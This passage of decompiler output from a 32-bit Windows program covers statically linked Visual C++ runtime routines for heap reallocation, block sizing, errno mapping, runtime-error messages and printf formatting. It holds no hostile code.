  if ( a2 > 0xFFFFFFE0 )
    return 0;
  if ( dword_446D6C == 3 )
  {
    _lock(9);
    ms_exc.registration.TryLevel = 0;
    block = __sbh_find_block(lpMem);
    v10 = block;
    if ( block )
    {
      v11 = 0;
      if ( a2 <= dword_446D64 )
      {
        if ( __sbh_resize_block(block, lpMem, a2) )
          v11 = lpMem;
      }
    }
    ms_exc.registration.TryLevel = -1;
    _unlock(9);
    if ( v10 )
      return v11;
    goto LABEL_20;
  }
  if ( dword_446D6C != 2 )
  {
LABEL_20:
    if ( !a2 )
      v2 = 1;
    v5 = (v2 + 15) & 0xFFFFFFF0;
    return HeapReAlloc(dword_446D68, 0x10u, lpMem, v5);
  }
  if ( !a2 )
    v2 = 1;
  v5 = (v2 + 15) & 0xFFFFFFF0;
  _lock(9);
  ms_exc.registration.TryLevel = 1;
  v6 = (_BYTE *)sub_412726((unsigned int)lpMem, &v7, (unsigned int *)&v9);
  v8 = v6;
  if ( v6 )
  {
    v11 = 0;
    if ( v5 <= dword_42A1AC && sub_412AEE((int)v7, v9, v6, v5 >> 4) )
      v11 = lpMem;
    _local_unwind2(&ms_exc.registration, -1);
    return v11;
  }
  ms_exc.registration.TryLevel = -1;
  _unlock(9);
  if ( !v8 )
    return HeapReAlloc(dword_446D68, 0x10u, lpMem, v5);
  return v11;
}
// 40B7DA: using guessed type _DWORD __cdecl _local_unwind2(_DWORD, _DWORD);
// 4119CB: using guessed type _DWORD __cdecl __sbh_find_block(_DWORD);
// 4121D4: using guessed type _DWORD __cdecl __sbh_resize_block(_DWORD, _DWORD, _DWORD);
// 412BC0: using guessed type _DWORD __cdecl _lock(_DWORD);
// 412C21: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 42A1AC: using guessed type int dword_42A1AC;
// 446D64: using guessed type int dword_446D64;
// 446D6C: using guessed type int dword_446D6C;

//----- (0040E6FD) --------------------------------------------------------
SIZE_T __cdecl sub_40E6FD(_DWORD *lpMem)
{
  int v1; // esi
  bool v2; // zf
  unsigned __int8 *v3; // eax
  void **v5; // [esp+Ch] [ebp-2Ch] BYREF
  unsigned __int8 *v6; // [esp+10h] [ebp-28h]
  unsigned int v7; // [esp+14h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-20h]
  int block; // [esp+1Ch] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h]

  if ( dword_446D6C == 3 )
  {
    _lock(9);
    ms_exc.registration.TryLevel = 0;
    block = __sbh_find_block(lpMem);
    if ( block )
    {
      v1 = *(lpMem - 1) - 9;
      v8 = v1;
    }
    else
    {
      v1 = v8;
    }
    ms_exc.registration.TryLevel = -1;
    _unlock(9);
    v2 = block == 0;
  }
  else
  {
    if ( dword_446D6C != 2 )
      return HeapSize(dword_446D68, 0, lpMem);
    _lock(9);
    ms_exc.registration.TryLevel = 1;
    v3 = (unsigned __int8 *)sub_412726((unsigned int)lpMem, &v5, &v7);
    v6 = v3;
    if ( v3 )
    {
      v1 = 16 * *v3;
      v8 = v1;
    }
    else
    {
      v1 = v8;
    }
    ms_exc.registration.TryLevel = -1;
    _unlock(9);
    v2 = v6 == 0;
  }
  if ( v2 )
    return HeapSize(dword_446D68, 0, lpMem);
  return v1;
}
// 4119CB: using guessed type _DWORD __cdecl __sbh_find_block(_DWORD);
// 412BC0: using guessed type _DWORD __cdecl _lock(_DWORD);
// 412C21: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 446D6C: using guessed type int dword_446D6C;

//----- (0040E7EB) --------------------------------------------------------
int *__cdecl sub_40E7EB(unsigned int a1)
{
  int v1; // esi
  _DWORD *v2; // eax
  int *result; // eax

  v1 = 0;
  *__doserrno() = a1;
  v2 = &unk_427D88;
  do
  {
    if ( a1 == *v2 )
    {
      result = _errno();
      *result = dword_427D8C[2 * v1];
      return result;
    }
    v2 += 2;
    ++v1;
  }
  while ( v2 < dword_427EF0 );
  if ( a1 < 0x13 || a1 > 0x24 )
  {
    if ( a1 < 0xBC || a1 > 0xCA )
    {
      result = _errno();
      *result = 22;
    }
    else
    {
      result = _errno();
      *result = 8;
    }
  }
  else
  {
    result = _errno();
    *result = 13;
  }
  return result;
}
// 427D8C: using guessed type int dword_427D8C[89];
// 427EF0: using guessed type _DWORD dword_427EF0[30];

//----- (0040EC58) --------------------------------------------------------
int sub_40EC58()
{
  return flsall(1);
}
// 40EC61: using guessed type _DWORD __cdecl flsall(_DWORD);

//----- (0040ED82) --------------------------------------------------------
void __noreturn sub_40ED82()
{
  _amsg_exit(0x19u);
}
// 40ED82: using guessed type void __noreturn sub_40ED82();

//----- (0040F61D) --------------------------------------------------------
char __cdecl sub_40F61D(int a1)
{
  HMODULE ModuleHandleA; // eax
  int v2; // ecx

  *(_DWORD *)a1 = 0;
  ModuleHandleA = GetModuleHandleA(0);
  if ( *(_WORD *)ModuleHandleA == 23117 )
  {
    v2 = *((_DWORD *)ModuleHandleA + 15);
    if ( v2 )
    {
      ModuleHandleA = (HMODULE)((char *)ModuleHandleA + v2);
      *(_BYTE *)a1 = *((_BYTE *)ModuleHandleA + 26);
      LOBYTE(ModuleHandleA) = *((_BYTE *)ModuleHandleA + 27);
      *(_BYTE *)(a1 + 1) = (_BYTE)ModuleHandleA;
    }
  }
  return (char)ModuleHandleA;
}

//----- (0040F64A) --------------------------------------------------------
int sub_40F64A()
{
  int result; // eax
  CHAR *i; // ecx
  char v2; // al
  CHAR *v3; // eax
  CHAR *j; // ecx
  char v5; // al
  char *v6; // eax
  const char *v7; // eax
  const char *v8; // ecx
  CHAR Buffer[4240]; // [esp+4h] [ebp-122Ch] BYREF
  CHAR Filename[260]; // [esp+1094h] [ebp-19Ch] BYREF
  struct _OSVERSIONINFOA VersionInformation; // [esp+1198h] [ebp-98h] BYREF
  char v12[4]; // [esp+122Ch] [ebp-4h] BYREF

  VersionInformation.dwOSVersionInfoSize = 148;
  if ( GetVersionExA(&VersionInformation)
    && VersionInformation.dwPlatformId == 2
    && VersionInformation.dwMajorVersion >= 5 )
  {
    return 1;
  }
  if ( !GetEnvironmentVariableA("__MSVCRT_HEAP_SELECT", Buffer, 0x1090u) )
    goto LABEL_29;
  for ( i = Buffer; *i; ++i )
  {
    v2 = *i;
    if ( *i >= 97 && v2 <= 122 )
      *i = v2 - 32;
  }
  if ( !strncmp("__GLOBAL_HEAP_SELECTED", Buffer, 0x16u) )
  {
    v3 = Buffer;
  }
  else
  {
    GetModuleFileNameA(0, Filename, 0x104u);
    for ( j = Filename; *j; ++j )
    {
      v5 = *j;
      if ( *j >= 97 && v5 <= 122 )
        *j = v5 - 32;
    }
    v3 = strstr(Buffer, Filename);
  }
  if ( !v3 )
    goto LABEL_29;
  v6 = strchr(v3, 44);
  if ( !v6 )
    goto LABEL_29;
  v7 = v6 + 1;
  v8 = v7;
  while ( *v8 )
  {
    if ( *v8 == 59 )
      *v8 = 0;
    else
      ++v8;
  }
  result = strtol(v7, 0, 10);
  if ( result != 2 && result != 3 && result != 1 )
  {
LABEL_29:
    sub_40F61D((int)v12);
    return 3 - (v12[0] < 6u);
  }
  return result;
}
// 40F64A: using guessed type char var_4[4];

//----- (0040F792) --------------------------------------------------------
int __cdecl sub_40F792(int a1)
{
  int v1; // eax
  void **v2; // eax

  dword_446D68 = HeapCreate(a1 == 0, 0x1000u, 0);
  if ( !dword_446D68 )
    return 0;
  v1 = sub_40F64A();
  dword_446D6C = v1;
  if ( v1 == 3 )
  {
    v2 = (void **)__sbh_heap_init(1016);
  }
  else
  {
    if ( v1 != 2 )
      return 1;
    v2 = sub_4124CA();
  }
  if ( !v2 )
  {
    HeapDestroy(dword_446D68);
    return 0;
  }
  return 1;
}
// 411983: using guessed type _DWORD __cdecl __sbh_heap_init(_DWORD);
// 446D6C: using guessed type int dword_446D6C;

//----- (0040F828) --------------------------------------------------------
int *__cdecl sub_40F828(DWORD NumberOfBytesWritten)
{
  int v1; // ecx
  int *result; // eax
  int v3; // esi
  char *v4; // edi
  const char **v5; // esi
  HANDLE StdHandle; // eax
  const char *v7; // [esp-14h] [ebp-1B8h]
  DWORD v8; // [esp-10h] [ebp-1B4h]
  DWORD *p_NumberOfBytesWritten; // [esp-Ch] [ebp-1B0h]
  int v10; // [esp-8h] [ebp-1ACh]
  CHAR Filename[260]; // [esp+0h] [ebp-1A4h] BYREF
  char Destination[160]; // [esp+104h] [ebp-A0h] BYREF
  int savedregs; // [esp+1A4h] [ebp+0h] BYREF

  v1 = 0;
  result = dword_427FA8;
  do
  {
    if ( NumberOfBytesWritten == *result )
      break;
    result += 2;
    ++v1;
  }
  while ( result < (int *)&off_428038 );
  v3 = 2 * v1;
  if ( NumberOfBytesWritten == dword_427FA8[2 * v1] )
  {
    result = (int *)dword_445880;
    if ( dword_445880 == 1 || !dword_445880 && dword_427B24 == 1 )
    {
      v5 = (const char **)&(&off_427FAC)[v3];
      v10 = 0;
      p_NumberOfBytesWritten = &NumberOfBytesWritten;
      v8 = strlen(*v5);
      v7 = *v5;
      StdHandle = GetStdHandle(0xFFFFFFF4);
      return (int *)WriteFile(StdHandle, v7, v8, &NumberOfBytesWritten, 0);
    }
    else if ( NumberOfBytesWritten != 252 )
    {
      if ( !GetModuleFileNameA(0, Filename, 0x104u) )
        strcpy(Filename, "<program name unknown>");
      v4 = Filename;
      if ( strlen(Filename) + 1 > 0x3C )
      {
        v4 = (char *)&savedregs + strlen(Filename) - 479;
        strncpy(v4, "...", 3u);
      }
      strcpy(Destination, "Runtime Error!\n\nProgram: ");
      strcat(Destination, v4);
      strcat(Destination, "\n\n");
      strcat(Destination, (&off_427FAC)[v3]);
      return (int *)__crtMessageBoxA(Destination, "Microsoft Visual C++ Runtime Library", 73744);
    }
  }
  return result;
}
// 414178: using guessed type _DWORD __cdecl __crtMessageBoxA(_DWORD, _DWORD, _DWORD);
// 427B24: using guessed type int dword_427B24;
// 427FA8: using guessed type int dword_427FA8[];
// 427FAC: using guessed type char *off_427FAC;
// 445880: using guessed type int dword_445880;

//----- (0040FA93) --------------------------------------------------------
int __cdecl sub_40FA93(FILE *File, char *a2, int a3)
{
  int v3; // ecx
  char v4; // bl
  char *v5; // esi
  bool v6; // zf
  int v7; // eax
  int int_arg; // eax
  int v9; // eax
  int v10; // esi
  int v11; // eax
  char *v12; // ecx
  char *i; // eax
  int v14; // edx
  char *v15; // edi
  wchar_t short_arg; // ax
  __int16 *v17; // eax
  int v18; // ecx
  int v19; // eax
  int v20; // eax
  void *v21; // eax
  char *j; // eax
  int v23; // edx
  _WORD *v24; // eax
  __int64 v25; // rax
  int v26; // eax
  int v27; // ebx
  _BYTE *v28; // eax
  char *v29; // eax
  char v30; // bl
  int v31; // esi
  wchar_t *v32; // ebx
  int v33; // edi
  wchar_t v34; // ax
  int v35; // eax
  char MbCh[511]; // [esp+Ch] [ebp-24Ch] BYREF
  char v39; // [esp+20Bh] [ebp-4Dh] BYREF
  int v40[2]; // [esp+20Ch] [ebp-4Ch] BYREF
  char v41[4]; // [esp+214h] [ebp-44h] BYREF
  int v42; // [esp+218h] [ebp-40h]
  int v43; // [esp+21Ch] [ebp-3Ch]
  int v44; // [esp+220h] [ebp-38h]
  int v45; // [esp+224h] [ebp-34h]
  LPVOID lpMem; // [esp+228h] [ebp-30h]
  int v47; // [esp+22Ch] [ebp-2Ch]
  int v48; // [esp+230h] [ebp-28h]
  int v49; // [esp+234h] [ebp-24h]
  unsigned __int64 v50; // [esp+238h] [ebp-20h]
  _WORD v51[3]; // [esp+242h] [ebp-16h] BYREF
  int v52; // [esp+248h] [ebp-10h]
  int v53; // [esp+24Ch] [ebp-Ch]
  int v54; // [esp+250h] [ebp-8h]
  int v55; // [esp+254h] [ebp-4h]
  char *v56; // [esp+264h] [ebp+Ch]

  v3 = 0;
  v52 = 0;
  v4 = *a2;
  v5 = a2 + 1;
  v6 = *a2 == 0;
  *(_DWORD *)&v51[1] = 0;
  lpMem = 0;
  v56 = a2 + 1;
  if ( !v6 )
  {
    while ( 1 )
    {
      if ( *(int *)&v51[1] < 0 )
        return *(_DWORD *)&v51[1];
      if ( v4 < 32 || v4 > 120 )
        v7 = 0;
      else
        v7 = aRuntimeErrorPr[v4 + 24] & 0xF;
      v43 = byte_4215B0[8 * v7 + v3] >> 4;
      switch ( v43 )
      {
        case 0:
          goto LABEL_42;
        case 1:
          v54 = -1;
          v42 = 0;
          v44 = 0;
          v48 = 0;
          v49 = 0;
          v55 = 0;
          v47 = 0;
          goto LABEL_179;
        case 2:
          switch ( v4 )
          {
            case ' ':
              v55 |= 2u;
              break;
            case '#':
              LOBYTE(v55) = v55 | 0x80;
              break;
            case '+':
              v55 |= 1u;
              break;
            case '-':
              v55 |= 4u;
              break;
            case '0':
              v55 |= 8u;
              break;
          }
          goto LABEL_179;
        case 3:
          if ( v4 == 42 )
          {
            int_arg = get_int_arg(&a3);
            v48 = int_arg;
            if ( int_arg >= 0 )
              goto LABEL_179;
            v55 |= 4u;
            v9 = -int_arg;
          }
          else
          {
            v9 = v4 + 10 * v48 - 48;
          }
          v48 = v9;
          goto LABEL_179;
        case 4:
          v54 = 0;
          goto LABEL_179;
        case 5:
          if ( v4 == 42 )
          {
            v54 = get_int_arg(&a3);
            if ( v54 < 0 )
              v54 = -1;
          }
          else
          {
            v54 = v4 + 10 * v54 - 48;
          }
          goto LABEL_179;
        case 6:
          switch ( v4 )
          {
            case 'I':
              if ( *v5 == 54 && v5[1] == 52 )
              {
                BYTE1(v55) |= 0x80u;
                v56 = v5 + 2;
              }
              else
              {
                v43 = 0;
LABEL_42:
                v47 = 0;
                if ( *((char *)off_42A37C + 2 * (unsigned __int8)v4 + 1) < 0 )
                {
                  write_char(v4, File, (int)&v51[1]);
                  v4 = *v5;
                  v56 = v5 + 1;
                }
                write_char(v4, File, (int)&v51[1]);
              }
              break;
            case 'h':
              v55 |= 0x20u;
              break;
            case 'l':
              v55 |= 0x10u;
              break;
            case 'w':
              v55 |= 0x800u;
              break;
          }
          goto LABEL_179;
        case 7:
          if ( v4 > 103 )
          {
            switch ( v4 )
            {
              case 'i':
                goto LABEL_119;
              case 'n':
                v24 = (_WORD *)get_int_arg(&a3);
                if ( (v55 & 0x20) != 0 )
                  *v24 = v51[1];
                else
                  *(_DWORD *)v24 = *(_DWORD *)&v51[1];
                v44 = 1;
                goto LABEL_177;
              case 'o':
                v52 = 8;
                if ( (v55 & 0x80u) != 0 )
                  v55 |= 0x200u;
                break;
              default:
                switch ( v4 )
                {
                  case 'p':
                    v54 = 8;
LABEL_110:
                    v45 = 7;
                    break;
                  case 's':
                    goto LABEL_55;
                  case 'u':
                    goto LABEL_120;
                  case 'x':
                    v45 = 39;
                    break;
                  default:
                    goto LABEL_154;
                }
                v52 = 16;
                if ( (v55 & 0x80u) != 0 )
                {
                  LOBYTE(v51[0]) = 48;
                  v49 = 2;
                  HIBYTE(v51[0]) = v45 + 81;
                }
                break;
            }
LABEL_121:
            if ( (v55 & 0x8000) == 0 )
            {
              if ( (v55 & 0x20) != 0 )
              {
                if ( (v55 & 0x40) != 0 )
                  LODWORD(v25) = (__int16)get_int_arg(&a3);
                else
                  LODWORD(v25) = (unsigned __int16)get_int_arg(&a3);
              }
              else
              {
                if ( (v55 & 0x40) == 0 )
                {
                  v25 = (unsigned int)get_int_arg(&a3);
                  goto LABEL_131;
                }
                LODWORD(v25) = get_int_arg(&a3);
              }
              v25 = (int)v25;
            }
            else
            {
              LODWORD(v25) = get_int64_arg(&a3);
            }
LABEL_131:
            if ( (v55 & 0x40) != 0 && v25 < 0 )
            {
              BYTE1(v55) |= 1u;
              v50 = -v25;
            }
            else
            {
              v50 = v25;
            }
            if ( (v55 & 0x8000) == 0 )
              HIDWORD(v50) = 0;
            if ( v54 >= 0 )
            {
              v55 &= ~8u;
              if ( v54 > 512 )
                v54 = 512;
            }
            else
            {
              v54 = 1;
            }
            if ( !v50 )
              v49 = 0;
            v53 = (int)&v39;
            while ( 1 )
            {
              v26 = v54--;
              if ( v26 <= 0 && !v50 )
                break;
              v27 = v50 % v52 + 48;
              v50 /= (unsigned __int64)v52;
              if ( v27 > 57 )
                LOBYTE(v27) = v45 + v27;
              v28 = (_BYTE *)v53--;
              *v28 = v27;
            }
            v29 = &v39 - v53++;
            v52 = (int)v29;
            if ( (v55 & 0x200) != 0 && (*(_BYTE *)v53 != 48 || !v29) )
            {
              --v53;
              v20 = (int)(v29 + 1);
              *(_BYTE *)v53 = 48;
              goto LABEL_153;
            }
            goto LABEL_154;
          }
          if ( v4 >= 101 )
            goto LABEL_65;
          if ( v4 > 88 )
          {
            if ( v4 == 90 )
            {
              v17 = (__int16 *)get_int_arg(&a3);
              if ( v17 && (v18 = *((_DWORD *)v17 + 1)) != 0 )
              {
                if ( (v55 & 0x800) != 0 )
                {
                  v19 = (unsigned int)*v17 >> 1;
                  v53 = v18;
                  v52 = v19;
                  v47 = 1;
                  goto LABEL_154;
                }
                v47 = 0;
                v53 = v18;
                v20 = *v17;
              }
              else
              {
                v53 = (int)off_428038;
                v20 = strlen(off_428038);
              }
              goto LABEL_153;
            }
            if ( v4 == 99 )
              goto LABEL_69;
            if ( v4 != 100 )
              goto LABEL_154;
LABEL_119:
            v55 |= 0x40u;
LABEL_120:
            v52 = 10;
            goto LABEL_121;
          }
          switch ( v4 )
          {
            case 'X':
              goto LABEL_110;
            case 'C':
              if ( (v55 & 0x830) == 0 )
                v55 |= 0x800u;
LABEL_69:
              if ( (v55 & 0x810) != 0 )
              {
                short_arg = get_short_arg(&a3);
                v52 = wctomb(MbCh, short_arg);
                if ( v52 < 0 )
                  v44 = 1;
              }
              else
              {
                MbCh[0] = get_int_arg(&a3);
                v52 = 1;
              }
              v53 = (int)MbCh;
              goto LABEL_154;
            case 'E':
            case 'G':
              v42 = 1;
              v4 += 32;
LABEL_65:
              v55 |= 0x40u;
              v15 = MbCh;
              v53 = (int)MbCh;
              if ( v54 >= 0 )
              {
                if ( v54 )
                {
                  if ( v54 > 512 )
                    v54 = 512;
                  if ( v54 > 163 )
                  {
                    v21 = malloc(v54 + 349);
                    lpMem = v21;
                    if ( v21 )
                    {
                      v15 = (char *)v21;
                      v53 = (int)v21;
                    }
                    else
                    {
                      v54 = 163;
                    }
                  }
                }
                else
                {
                  v54 = v4 == 103;
                }
              }
              else
              {
                v54 = 6;
              }
              a3 += 8;
              v40[0] = *(_DWORD *)(a3 - 8);
              v40[1] = *(_DWORD *)(a3 - 4);
              off_428040(v40, v15, v4, v54, v42);
              break;
          }
          if ( v4 == 83 )
          {
            if ( (v55 & 0x830) == 0 )
              v55 |= 0x800u;
LABEL_55:
            v10 = 0x7FFFFFFF;
            if ( v54 != -1 )
              v10 = v54;
            v11 = get_int_arg(&a3);
            v12 = (char *)v11;
            v53 = v11;
            if ( (v55 & 0x810) != 0 )
            {
              if ( !v11 )
              {
                v12 = (char *)off_42803C;
                v53 = (int)off_42803C;
              }
              v47 = 1;
              for ( i = v12; ; i += 2 )
              {
                v14 = v10--;
                if ( !v14 || !*(_WORD *)i )
                  break;
              }
              v20 = (i - v12) >> 1;
            }
            else
            {
              if ( !v11 )
              {
                v12 = off_428038;
                v53 = (int)off_428038;
              }
              for ( j = v12; ; ++j )
              {
                v23 = v10--;
                if ( !v23 || !*j )
                  break;
              }
              v20 = j - v12;
            }
LABEL_153:
            v52 = v20;
          }
LABEL_154:
          if ( v44 )
            goto LABEL_177;
          v30 = v55;
          if ( (v55 & 0x40) == 0 )
            goto LABEL_163;
          if ( (v55 & 0x100) != 0 )
          {
            LOBYTE(v51[0]) = 45;
LABEL_162:
            v49 = 1;
            goto LABEL_163;
          }
          if ( (v55 & 1) != 0 )
          {
            LOBYTE(v51[0]) = 43;
            goto LABEL_162;
          }
          if ( (v55 & 2) != 0 )
          {
            LOBYTE(v51[0]) = 32;
            goto LABEL_162;
          }
LABEL_163:
          v31 = v48 - v49 - v52;
          if ( (v55 & 0xC) == 0 )
            write_multi_char(32, v48 - v49 - v52, File, (int)&v51[1]);
          write_string((int)v51, v49, File, (int)&v51[1]);
          if ( (v30 & 8) != 0 && (v30 & 4) == 0 )
            write_multi_char(48, v31, File, (int)&v51[1]);
          if ( v47 && v52 > 0 )
          {
            v32 = (wchar_t *)v53;
            v33 = v52 - 1;
            do
            {
              v34 = *v32++;
              v35 = wctomb(v41, v34);
              if ( v35 <= 0 )
                break;
              write_string((int)v41, v35, File, (int)&v51[1]);
            }
            while ( v33-- );
          }
          else
          {
            write_string(v53, v52, File, (int)&v51[1]);
          }
          if ( (v55 & 4) != 0 )
            write_multi_char(32, v31, File, (int)&v51[1]);
LABEL_177:
          if ( lpMem )
          {
            sub_40B886(lpMem);
            lpMem = 0;
          }
LABEL_179:
          v4 = *v56;
          v5 = v56 + 1;
          v6 = *v56++ == 0;
          if ( v6 )
            return *(_DWORD *)&v51[1];
          v3 = v43;
          break;
        default:
          goto LABEL_179;
      }
    }
  }
  return *(_DWORD *)&v51[1];
}
// 41000E: variable 'v25' is possibly undefined
// 4102CF: using guessed type _DWORD __cdecl get_int_arg(_DWORD);
// 4102DC: using guessed type _DWORD __cdecl get_int64_arg(_DWORD);
// 4102EC: using guessed type _DWORD __cdecl get_short_arg(_DWORD);
// 42803C: using guessed type wchar_t *off_42803C;
// 428040: using guessed type int (__cdecl *off_428040)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 42A37C: using guessed type void *off_42A37C;
// 40FA93: using guessed type char var_44[4];

//----- (0041192D) --------------------------------------------------------
void __usercall __noreturn sub_41192D(EXCEPTION_POINTERS *a1@<ecx>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  int v4; // [esp-Ch] [ebp-24h] BYREF
  int v5; // [esp-8h] [ebp-20h]
  int v6; // [esp-4h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+0h] [ebp-18h]

  ms_exc.registration.ScopeTable = stru_421780;
  ms_exc.registration.ExceptionHandler = _except_handler3;
  ms_exc.registration.Next = (struct _EH3_EXCEPTION_REGISTRATION *)NtCurrentTeb()->NtTib.ExceptionList;
  ms_exc.exc_ptr = a1;
  v6 = a2;
  v5 = a4;
  v4 = a3;
  ms_exc.old_esp = (DWORD)&v4;
  ms_exc.registration.TryLevel = 0;
  if ( off_428180 )
    off_428180(
      v4,
      v5,
      v6,
      ms_exc.old_esp,
      ms_exc.exc_ptr,
      ms_exc.registration.Next,
      ms_exc.registration.ExceptionHandler,
      ms_exc.registration.ScopeTable,
      1);
  ms_exc.registration.TryLevel = -1;
  terminate();
}
// 421780: using guessed type _SCOPETABLE_ENTRY stru_421780[2];
// 428180: using guessed type int (__cdecl *off_428180)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004119F6) --------------------------------------------------------
_DWORD *__cdecl sub_4119F6(_DWORD *a1, int a2)
{
  _DWORD *result; // eax
  int *v3; // esi
  unsigned int v4; // edi
  int v5; // ecx
  char *v6; // ebx
  unsigned int v7; // edx
  _BYTE *v8; // ecx
  unsigned int v9; // ebx
  bool v10; // zf
  _BYTE *v11; // ecx
  unsigned int v12; // ebx
  unsigned int v13; // edx
  unsigned int v14; // ebx
  unsigned int v15; // esi
  unsigned int v16; // esi
  _DWORD *v17; // ecx
  LPVOID *v18; // eax
  _DWORD *v19; // [esp+Ch] [ebp-10h]
  int v20; // [esp+10h] [ebp-Ch]
  int v21; // [esp+14h] [ebp-8h]
  int v22; // [esp+18h] [ebp-4h]
  char *v23; // [esp+28h] [ebp+Ch]
  int *v24; // [esp+28h] [ebp+Ch]
  char v25; // [esp+2Bh] [ebp+Fh]

  result = (_DWORD *)a1[4];
  v3 = (int *)(a2 - 4);
  v4 = (unsigned int)(a2 - a1[3]) >> 15;
  v19 = &result[129 * v4 + 81];
  v5 = *(_DWORD *)(a2 - 4) - 1;
  v22 = v5;
  if ( (v5 & 1) == 0 )
  {
    v6 = (char *)v3 + v5;
    v20 = *(int *)((char *)v3 + v5);
    v21 = *(_DWORD *)(a2 - 8);
    v23 = (char *)v3 + v5;
    if ( (v20 & 1) == 0 )
    {
      v7 = (v20 >> 4) - 1;
      if ( v7 > 0x3F )
        v7 = 63;
      if ( *((_DWORD *)v6 + 1) == *((_DWORD *)v6 + 2) )
      {
        if ( v7 >= 0x20 )
        {
          v11 = (char *)result + v7 + 4;
          v12 = ~(0x80000000 >> (v7 - 32));
          result[v4 + 49] &= v12;
          v10 = (*v11)-- == 1;
          if ( v10 )
            a1[1] &= v12;
        }
        else
        {
          v8 = (char *)result + v7 + 4;
          v9 = ~(0x80000000 >> v7);
          result[v4 + 17] &= v9;
          v10 = (*v8)-- == 1;
          if ( v10 )
            *a1 &= v9;
        }
        v5 = v22;
        v6 = v23;
      }
      v5 += v20;
      *(_DWORD *)(*((_DWORD *)v6 + 2) + 4) = *((_DWORD *)v6 + 1);
      v22 = v5;
      *(_DWORD *)(*((_DWORD *)v23 + 1) + 8) = *((_DWORD *)v23 + 2);
    }
    v13 = (v5 >> 4) - 1;
    if ( v13 > 0x3F )
      v13 = 63;
    if ( (v21 & 1) != 0 )
    {
      v14 = (unsigned int)a1;
    }
    else
    {
      v24 = (int *)((char *)v3 - v21);
      v14 = (v21 >> 4) - 1;
      if ( v14 > 0x3F )
        v14 = 63;
      v22 = v21 + v5;
      v13 = ((v21 + v5) >> 4) - 1;
      if ( v13 > 0x3F )
        v13 = 63;
      if ( v14 != v13 )
      {
        if ( v24[1] == v24[2] )
        {
          if ( v14 >= 0x20 )
          {
            v16 = ~(0x80000000 >> (v14 - 32));
            result[v4 + 49] &= v16;
            v10 = (*((_BYTE *)result + v14 + 4))-- == 1;
            if ( v10 )
              a1[1] &= v16;
          }
          else
          {
            v15 = ~(0x80000000 >> v14);
            result[v4 + 17] &= v15;
            v10 = (*((_BYTE *)result + v14 + 4))-- == 1;
            if ( v10 )
              *a1 &= v15;
          }
        }
        *(_DWORD *)(v24[2] + 4) = v24[1];
        *(_DWORD *)(v24[1] + 8) = v24[2];
      }
      v3 = v24;
    }
    if ( (v21 & 1) != 0 || v14 != v13 )
    {
      v17 = &v19[2 * v13];
      v3[1] = v17[1];
      v3[2] = (int)v17;
      v17[1] = v3;
      *(_DWORD *)(v3[1] + 8) = v3;
      if ( v3[1] == v3[2] )
      {
        v25 = *((_BYTE *)result + v13 + 4);
        *((_BYTE *)result + v13 + 4) = v25 + 1;
        if ( v13 >= 0x20 )
        {
          if ( !v25 )
            a1[1] |= 0x80000000 >> (v13 - 32);
          result[v4 + 49] |= 0x80000000 >> (v13 - 32);
        }
        else
        {
          if ( !v25 )
            *a1 |= 0x80000000 >> v13;
          result[v4 + 17] |= 0x80000000 >> v13;
        }
      }
    }
    *v3 = v22;
    *(int *)((char *)v3 + v22 - 4) = v22;
    result += 129 * v4 + 81;
    v10 = (*v19)-- == 1;
    if ( v10 )
    {
      if ( dword_446D58 )
      {
        VirtualFree((LPVOID)(*((_DWORD *)dword_446D58 + 3) + (dword_446D50 << 15)), 0x8000u, 0x4000u);
        *((_DWORD *)dword_446D58 + 2) |= 0x80000000 >> dword_446D50;
        *(_DWORD *)(*((_DWORD *)dword_446D58 + 4) + 4 * dword_446D50 + 196) = 0;
        --*(_BYTE *)(*((_DWORD *)dword_446D58 + 4) + 67);
        v18 = (LPVOID *)dword_446D58;
        if ( !*(_BYTE *)(*((_DWORD *)dword_446D58 + 4) + 67) )
        {
          *((_DWORD *)dword_446D58 + 1) &= ~1u;
          v18 = (LPVOID *)dword_446D58;
        }
        if ( v18[2] == (LPVOID)-1 )
        {
          VirtualFree(v18[3], 0, 0x8000u);
          HeapFree(dword_446D68, 0, *((LPVOID *)dword_446D58 + 4));
          memcpy(dword_446D58, (char *)dword_446D58 + 20, (size_t)lpMem + 20 * dword_446D5C - (_DWORD)dword_446D58 - 20);
          --dword_446D5C;
          if ( a1 > dword_446D58 )
            a1 -= 5;
          dword_446D54 = (int)lpMem;
        }
      }
      result = a1;
      dword_446D50 = v4;
      dword_446D58 = a1;
    }
  }
  return result;
}
// 446D50: using guessed type int dword_446D50;
// 446D54: using guessed type int dword_446D54;
// 446D5C: using guessed type int dword_446D5C;

//----- (004124CA) --------------------------------------------------------
void **sub_4124CA()
{
  void **v0; // esi
  _DWORD *v1; // eax
  _DWORD *v2; // edi
  int *v3; // eax
  int v4; // ebp
  int v5; // edx

  if ( dword_428198 == -1 )
  {
    v0 = &off_428188;
  }
  else
  {
    v0 = (void **)HeapAlloc(dword_446D68, 0, 0x2020u);
    if ( !v0 )
      return 0;
  }
  v1 = VirtualAlloc(0, 0x400000u, 0x2000u, 4u);
  v2 = v1;
  if ( !v1 )
  {
LABEL_19:
    if ( v0 != &off_428188 )
      HeapFree(dword_446D68, 0, v0);
    return 0;
  }
  if ( !VirtualAlloc(v1, 0x10000u, 0x1000u, 4u) )
  {
    VirtualFree(v2, 0, 0x8000u);
    goto LABEL_19;
  }
  if ( v0 == &off_428188 )
  {
    if ( !off_428188 )
      off_428188 = &off_428188;
    if ( !off_42818C )
      off_42818C = &off_428188;
  }
  else
  {
    *v0 = &off_428188;
    v0[1] = off_42818C;
    off_42818C = v0;
    *(_DWORD *)v0[1] = v0;
  }
  v0[5] = v2 + 0x100000;
  v3 = (int *)(v0 + 6);
  v0[3] = v0 + 38;
  v0[4] = v2;
  v0[2] = v0 + 6;
  v4 = 0;
  do
  {
    v5 = v4++ >= 16 ? -1 : 240;
    *v3 = v5;
    v3[1] = 241;
    v3 += 2;
  }
  while ( v4 < 1024 );
  memset(v2, 0, 0x10000u);
  while ( v2 < (_DWORD *)((char *)v0[4] + 0x10000) )
  {
    *((_BYTE *)v2 + 248) = -1;
    *v2 = v2 + 2;
    v2[1] = 240;
